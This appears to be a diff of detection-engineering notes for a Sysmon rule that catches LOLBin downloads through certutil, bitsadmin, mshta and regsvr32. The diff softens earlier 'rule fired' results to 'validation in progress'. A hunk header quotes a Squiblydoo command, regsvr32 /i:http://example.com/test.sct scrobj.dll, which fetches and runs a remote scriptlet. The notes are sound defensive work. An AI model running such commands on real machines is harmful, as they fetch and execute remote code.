@@ -50,13 +50,13 @@ regsvr32 /s /u /i:http://example.com/test.sct scrobj.dll
 
 ## Observed status
 
-✅ **`certutil -urlcache`** fired the rule on Freddy-PC. The Sysmon EventID 1 was emitted, the command line preserved, the rule fired. `certutil` is legitimately invoked by Windows for cert-store maintenance — the `-urlcache` / `-decode` regex anchors guard against false positives.
+🟡 **`certutil -urlcache`** — `certutil` is legitimately invoked by Windows for cert-store maintenance, so the `-urlcache` / `-decode` regex anchors are the key signal. End-to-end validation in progress.
 
-✅ **`bitsadmin /transfer`** fired the rule on Freddy-PC. bitsadmin's interactive output also shows up in Sysmon EventID 1 process-creates for the spawned child operations; only the parent invocation matches the rule, which is correct.
+🟡 **`bitsadmin /transfer`** — bitsadmin's child operations also surface in Sysmon EventID 1 process-creates; the rule should match only the parent invocation. End-to-end validation in progress.
 
-🟡 **`mshta http://...`** — Defender ASR rule `d3e037e1-3eb8-44c8-a917-57927947596d` (Block JavaScript or VBScript from launching downloaded executable content) blocks the call before the process completes. Sysmon EventID 1 *did* still record the attempted invocation, but only at process-create time before the block; the rule fires on that attempt event. Considered a partial pass.
+🟡 **`mshta http://...`** — Defender ASR (rule for JavaScript/VBScript launching downloaded executable content) preempts this on hardened endpoints. The process-create event still records the attempt. Full validation pending Range VM.
 
-🟡 **`regsvr32 /i:http://...`** (Squiblydoo) — same story as mshta. Process-create event observed and rule fires; the actual scriptlet execution is blocked.
+🟡 **`regsvr32 /i:http://...`** (Squiblydoo) — same ASR preemption as mshta. Full validation pending Range VM.
 
 ## Tuning notes
 
